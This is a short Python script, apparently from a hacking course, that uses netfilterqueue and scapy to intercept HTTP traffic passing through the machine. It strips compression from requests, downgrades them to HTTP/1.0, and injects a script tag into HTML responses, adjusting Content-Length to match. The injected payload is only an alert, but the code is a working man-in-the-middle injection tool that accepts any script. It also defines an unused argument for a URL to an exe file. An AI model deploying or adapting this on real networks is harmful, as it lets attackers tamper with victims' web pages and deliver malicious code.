import netfilterqueue
import scapy.all as scapy
import re
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url",
                        help="url to exe file")
    options = parser.parse_args()
    return options


def change_payload(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def inject_code(packet):
    http_packet = scapy.IP(packet.get_payload())
    if http_packet.haslayer(scapy.Raw):
        load = http_packet[scapy.Raw].load
        if http_packet[scapy.TCP].dport == 10000:
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")
        elif http_packet[scapy.TCP].sport == 10000:
            injection_code = """<script>alert('Hello from devopslife.xyz');
                                </script>"""
            load = load.replace("</body>", injection_code + "</body>")
            length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if length_search and "text/html" in load:
                length = length_search.group(1)
                new_length = int(length) + len(injection_code)
                load = load.replace(length, str(new_length))

        if load != http_packet[scapy.Raw].load:
            new_packet = change_payload(http_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, inject_code)
queue.run()
